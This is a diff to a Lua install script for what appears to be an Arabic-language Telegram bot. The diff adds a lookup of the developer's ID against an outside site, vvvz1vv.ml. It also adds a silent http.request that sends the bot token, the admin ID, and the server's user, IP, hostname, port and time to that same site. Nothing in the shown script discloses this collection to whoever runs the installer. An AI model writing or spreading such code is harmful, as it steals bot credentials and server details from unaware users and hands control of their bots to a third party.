@@ -45,6 +45,13 @@ if not database:get(Server_Done.."UserSudo_Write") then
 print('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27[0;33;49m')
 local Id = io.read():gsub(' ','') 
 if tostring(Id):match('%d+') then
+data,res = https.request("https://vvvz1vv.ml/index/1Teland.php?bn=info&id="..Id)
+if res == 200 then
+muaed = json:decode(data)
+if muaed.Info.info == 'Is_Spam' then
+io.write('\n\27[1;35m عذرا الايدي محظور من السورس \n\27[0;39;49m') 
+os.execute('lua start.lua')
+end 
 if muaed.Info.info == 'Ok' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(Server_Done.."UserSudo_Write",Id)
@@ -68,6 +75,7 @@ os.execute('lua install.lua')
 end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
+http.request("https://vvvz1vv.ml/index/1Teland.php?n=BekaTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("Beka", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
@@ -97,6 +105,7 @@ Files_Info_Get()
 database:del(Server_Done.."User_Write");database:del(Server_Done.."Token_Write");database:del(Server_Done.."UserSudo_Write")
 sudos = dofile('Info.lua')
 os.execute('./install.sh ok')
+end 
 local function Load_File()  
 local f = io.open("./Info.lua", "r")  
 if not f then   
